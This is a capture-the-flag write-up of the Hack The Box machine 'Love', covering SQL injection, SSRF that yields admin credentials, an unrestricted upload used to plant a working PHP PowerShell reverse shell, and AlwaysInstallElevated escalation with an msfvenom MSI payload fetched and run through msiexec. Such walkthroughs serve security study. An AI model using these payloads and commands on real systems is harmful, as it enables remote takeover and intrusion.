# Enumeration
I began by the standard enumeration flow, using `nmap`

```bash
# Nmap 7.91 scan initiated Wed Jun  9 13:19:10 2021 as: nmap -sC -sV -oA nmap/love 10.10.10.239

```

So, there are a few interesting things that may be seen. Visiting port `80` shows a voting system, port `5000` just shows an Access Denied page, and the SSL certificate from port `443` shows a different name (`staging.love.htb`).

## Voting System (port 80)
I spent a while on this, the first thing I noticed is that the `voter` field is vulnerable to a timing SQL injection, using `sqlmap` I was able to pull the following credentials from it:

```
admin:$2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC
```

Unfortunately, throwing that hash into JTR and Hashcat reveals nothing, so that appears to be a deadend.

Continuing with the voting system enumeration, `gobuster` reveals that there are multiple directories with listings open and other additonal directories.

```
/admin
/includes
/images
```

Those both could be interesting, but lets check out the other ports

## File Scanning (staging.love.htb)
Adding `10.10.10.239 staging.love.htb` to my `/etc/hosts` file, I'm able to access this new site. It has a notification system (that doesn't do anything) and a demo file scan. The demo file scan will download and display a file that you give it.

## Forbidden (port 5000)
There's another HTTP instance running on port 5000, but whenever visiting this page or attempting to access any subdirectories from it, I simply receive a `403 Forbidden` error.

### Accessing Forbidden
This part took me a long time to figure out, longer than it likely should have, but if you use the file scanner from `staging.love.htb` to scan `127.0.0.1:5000`, it can access the page! It'll return 

> Vote Admin Creds admin: @LoveIsInTheAir!!!!

## Vote Login
Given the previous credentials pulled fromt he forbitten page, I was then able to access the admin page located at `love.htb/admin` using the credentials `admin:@LoveIsInTheAir!!!!`!

## Getting a Shell
Now that I have admin login, it's time to look around. I immediately notice that I can create a user and upload a photo. I wonder if there's any validate that this is a valid photo?

Since this is a PHP website running on a Windows machine (all stuff I know from the nmap scan and the file extensions in the URL), I crafted a PHP PowerShell reverse shell payload:

```php
<?php

exec("powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.10.14.204',9000);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush();}\$client.Close()\"");
```

I then started a reverse shell

```bash
$ nc -lnvp 9000
```

And uploaded this PHP file as an image. And it worked, no validate on the type of file being uploaded at all!!

```bash
PS C:\xampp\htdocs\omrs\images> whoami
love\phoebe
```

# Privesc
Now that I have a low level shell, it's time to begin enumeration again to determine how to move to a system shell. After checking a few of the standard enumeration paths, I noticed the following:

```batch
PS C:\xampp\htdocs\omrs\images> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\xampp\htdocs\omrs\images> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Because those (either one) are set to true, that means that any user is able to execute a `.msi` as system! So I then crafted an MSI payload:

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.204 lport=1234 -f msi > rshell1234.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes

$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Back on Windows I executed the installer

```batch
> msiexec /q /i http://10.10.14.204/rshell1234.msi
```

And on my machine I had a metasploit listener set up

```bash
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.14.204; set lport 1234; run"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
lhost => 10.10.14.204
lport => 1234
[*] Started reverse TCP handler on 10.10.14.204:1234 
[*] Sending stage (175174 bytes) to 10.10.10.239
[*] Meterpreter session 1 opened (10.10.14.204:1234 -> 10.10.10.239:62952) at 2021-06-10 20:59:28 -0400

meterpreter > shell

C:\WINDOWS\system32>whoami

```

And success! We now have a system shell!!
